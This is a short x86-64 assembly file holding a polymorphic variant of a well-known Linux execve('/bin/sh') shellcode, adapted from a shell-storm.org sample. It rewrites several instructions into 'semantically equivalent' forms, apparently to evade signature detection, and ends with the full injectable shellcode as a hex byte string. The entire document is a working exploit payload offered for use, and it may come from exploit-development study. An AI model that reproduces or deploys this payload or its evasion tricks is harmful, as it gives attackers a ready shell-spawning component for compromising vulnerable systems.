; David @InfinitelyManic
; original code http://shell-storm.org/shellcode/files/shellcode-603.php
section .text
	global _start

_start:
	;xor   rdx, rdx
	cdq				; symantically equiv; rax = 0 is implied so edx is set to 0

	mov	qword rbx, '//bin/sh'	; extra / to bring to 8 chars  
	shr	rbx, 0x8		; shift off byte 0x48

	push byte 0x90			; nop equiv
	pop rcx				; nop equiv

	push	rbx			; filename
	mov	rdi, rsp		; filename 
	push	rax			; nulls
	push	rdi			; second 
	mov	rsi, rsp		; execve struct

	; mov al,	0x3b		; execve syscall  
	push byte 0x3b			; symantically equiv
	pop rax				; symantically equiv

	syscall
	
	; shellcode
	; \x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x6a\x90\x59\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05


